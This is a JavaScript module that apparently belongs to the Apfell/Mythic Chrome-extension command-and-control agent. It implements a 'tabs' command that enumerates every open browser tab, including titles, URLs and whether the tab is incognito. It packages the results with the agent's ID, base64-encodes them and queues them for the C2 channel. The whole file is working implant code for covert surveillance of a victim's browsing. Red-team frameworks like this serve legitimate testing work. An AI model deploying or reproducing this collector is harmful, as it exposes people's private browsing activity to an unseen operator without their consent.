tabs = function(task) {
    const queryInfo = {};
    let tabs =[];
    chrome.tabs.query(queryInfo, function(result){
        for (let i = 0; i < result.length; i++) {
            const individualTab = {};
            individualTab.window = result[i].title;
            individualTab.url = result[i].url;
            individualTab.incognito = result[i].incognito;
            individualTab.id = result[i].id;
            individualTab.active = result[i].active;
            individualTab.highlighted = result[i].highlighted;
            individualTab.windowid = result[i].windowId;

            tabs.push(individualTab);
        }

        let output = JSON.stringify(tabs, null, 2);
        let response = {"task_id":task.task_id, "user_output":output, "completed": true};
        let outer_response = {"action":"post_response", "responses":[response], "delegates":[]};
        let enc = JSON.stringify(outer_response);
        let final = apfell.apfellid + enc;
        let msg = btoa(unescape(encodeURIComponent(final)));
        out.push(msg);
    });
};

C2.commands[tabs.name] = tabs;
COMMAND_ENDS_HERE
